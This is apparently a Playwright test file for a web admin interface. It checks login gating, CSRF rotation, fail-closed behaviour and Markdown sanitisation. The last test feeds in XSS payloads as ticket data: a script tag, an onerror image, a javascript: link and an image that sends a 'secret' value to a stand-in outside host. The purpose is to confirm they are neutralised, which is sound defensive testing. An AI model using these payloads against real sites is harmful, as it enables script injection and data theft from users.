import { test, expect } from "./fixtures";

test("access gate hides business data, rotates CSRF after login and clears the view on logout", async ({ page }) => {
  let authenticated = false;
  let token = "bootstrap-csrf";
  const passwords: unknown[] = [];
  await page.route("**/api/access/session", (route) => route.fulfill({ json: { mode: "password", authenticated, csrf_token: token, expires_at: authenticated ? new Date(Date.now() + 60000).toISOString() : null } }));
  await page.route("**/api/access/login", (route) => {
    expect(route.request().headers()["x-csrftoken"]).toBe("bootstrap-csrf");
    passwords.push(route.request().postDataJSON());
    authenticated = true; token = "rotated-csrf";
    return route.fulfill({ json: { authenticated } });
  });
  await page.route("**/api/access/logout", (route) => {
    expect(route.request().headers()["x-csrftoken"]).toBe("rotated-csrf");
    authenticated = false; token = "signed-out-csrf";
    return route.fulfill({ json: { authenticated } });
  });
  await page.route("**/api/environments", (route) => route.fulfill({ json: [] }));
  await page.route("**/api/requests", (route) => route.fulfill({ json: [] }));
  await page.route("**/api/queue", (route) => route.fulfill({ json: [] }));
  await page.goto("/admin");
  await page.getByRole("combobox").selectOption("en");
  await expect(page.getByRole("heading", { name: "Settings", exact: true })).toHaveCount(0);
  await expect(page.getByRole("navigation")).toHaveCount(0);
  await page.getByLabel("Instance password", { exact: true }).fill("fixture-team-access-password");
  await page.getByRole("button", { name: "Sign in", exact: true }).click();
  await expect(page.getByRole("heading", { name: "Settings", exact: true })).toBeVisible();
  expect(passwords).toEqual([{ password: "fixture-team-access-password" }]);
  expect(await page.evaluate(() => JSON.stringify(localStorage))).not.toContain("fixture-team-access-password");
  await page.getByRole("button", { name: "Sign out", exact: true }).click();
  await expect(page.getByLabel("Instance password", { exact: true })).toBeVisible();
  await expect(page.getByRole("heading", { name: "Settings", exact: true })).toHaveCount(0);
});

test("unconfigured exposed instance fails closed and offers retry without mounting administration", async ({ page }) => {
  await page.route("**/api/access/session", (route) => route.fulfill({ status: 503, json: { mode: "unconfigured", authenticated: false } }));
  await page.goto("/admin");
  await page.getByRole("combobox").selectOption("en");
  await expect(page.getByRole("main").getByRole("alert")).toContainText("Instance access is unavailable");
  await expect(page.getByRole("navigation")).toHaveCount(0);
  await expect(page.getByRole("button", { name: "Retry", exact: true })).toBeVisible();
});

test("hostile ticket Markdown cannot execute scripts, unsafe links or remote images", async ({ page }) => {
  const id = "19191919-1919-4919-8919-191919191919";
  const ticket = { id, title: "Hostile template", platform: "jira", environment_name: "Production", external_key: "TEAM-1", status: "PUBLISHED", version_number: 1, labels: [], payload_available: true };
  const requests: string[] = [];
  await page.route("https://outside.example.test/**", (route) => { requests.push(route.request().url()); return route.abort(); });
  await page.route("**/api/tickets?*", (route) => route.fulfill({ json: { items: [ticket], total: 1, page: 1, page_size: 25, environments: ["Production"], statuses: ["PUBLISHED"] } }));
  await page.route(`**/api/tickets/${id}`, (route) => route.fulfill({ json: { ...ticket, description: "# Untrusted data\n\n<script>window.compromised=true</script>\n<img src=x onerror=window.compromised=true>\n[click](javascript:window.compromised=true)\n![tracking](https://outside.example.test/collect?private=secret)\n\nSafe explanation." } }));
  await page.goto("/tickets");
  await expect(page.getByTestId("ticket-description")).toContainText("Safe explanation.");
  await expect(page.getByTestId("ticket-description").locator("script,img,[onerror],a[href^='javascript:']")).toHaveCount(0);
  expect(await page.evaluate(() => (window as Window & { compromised?: boolean }).compromised)).toBeUndefined();
  expect(requests).toEqual([]);
});
